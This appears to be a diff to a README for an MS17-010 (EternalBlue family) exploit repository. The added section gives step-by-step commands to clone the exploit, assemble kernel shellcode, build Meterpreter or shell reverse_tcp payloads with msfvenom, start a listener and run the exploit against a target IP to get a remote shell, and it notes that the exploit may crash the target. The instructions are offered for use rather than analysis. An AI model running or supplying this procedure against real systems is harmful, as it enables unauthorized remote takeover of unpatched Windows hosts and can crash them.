@@ -41,3 +41,28 @@ Anonymous user (null session) get more restriction on default settings of new Wi
 * **Eternalromance** requires access to named pipe. The exploit can target Windows < 8 because the bug for info leak is fixed in Windows 8. The exploit should have a chance to crash a target lower than Eternalblue. I never test a reliable of the exploit.
 * **Eternalsynergy** requires access to named pipe. I believe this exploit is modified from Eternalromance to target Windows 8 and later. Eternalsynergy uses another bug for info leak and does some trick to find executable memory (I do not know how it works because I read only output log and pcap file).
 
+## Instructions to perform exploit
+
+**Step 1:** `git clone https://github.com/w0rtw0rt/MS17-010.git && cd MS17-010/`
+**Step 1a:** gedit/vi/nano eternalblue_exploit8.py and change lines 52 and 53 to match the account authentication
+example:
+USERNAME='Guest'
+PASSWORD=''
+
+**Step 2:** cd shellcode and type `nasm -f bin eternalblue_kshellcode_x64(x86).asm`
+
+**Step 3:** `msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o meterpreter_(IP)_msf.bin EXITFUNC=thread LHOST=(IP) LPORT=(Port)`
+
+**Step 3a:** `msfvenom -p windows/x64/shell/reverse_tcp -f raw -o shell_(IP)_msf.bin EXITFUNC=thread LHOST=(IP) LPORT=(Port)`
+
+**Step 4:** `cat eternalblue_kshellcode_x64(x86) shell_(IP)_msf.bin (OR meterpreter_(IP)_msf.bin) > (payloadname).bin`
+
+**Step 5:** Set up exploit/multi/handler in a new terminal window with matching payload you created above and run it
+
+**Step 6:** `cd MS17-010`
+
+**Step 7:** `python eternalblue_exploit8.py (target IP) (payloadname).bin (GROOM COUNT)`
+
+**-side note-** Groom count will typically function with a "200" for windows 8/2012r2 but *might* crash the system - use at your own risk
+
+**Step 8:** shell/meterpreter should be returned if "Guest" account is active or entered credentials worked.
